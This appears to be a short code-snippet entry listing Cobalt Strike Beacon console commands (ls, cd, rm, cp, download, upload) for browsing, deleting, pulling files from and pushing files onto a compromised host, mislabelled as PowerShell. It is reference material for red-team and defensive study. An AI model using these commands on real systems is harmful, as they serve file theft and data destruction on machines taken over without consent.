---
id: da7b18c6-1c2a-4f68-b4e7-cbd07f343e0b
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:16.436624+00:00'
updated_at: '2023-04-10T20:36:25.677467+00:00'
---

# Code Snippet da7b18c6

**Language**: Powershell

```powershell
# List the file on the specified directory
beacon > ls <C:\Path>

# Change into the specified working directory
beacon > cd [directory]

# Delete a file\folder
beacon > rm [file\folder]

# File copy
beacon > cp [src] [dest]

# Download a file from the path on the Beacon host
beacon > download [C:\filePath]

# Lists downloads in progress
beacon > downloads

# Cancel a download currently in progress
beacon > cancel [*file*]

# Upload a file from the attacker to the current Beacon host
beacon > upload [/path/to/file]
```


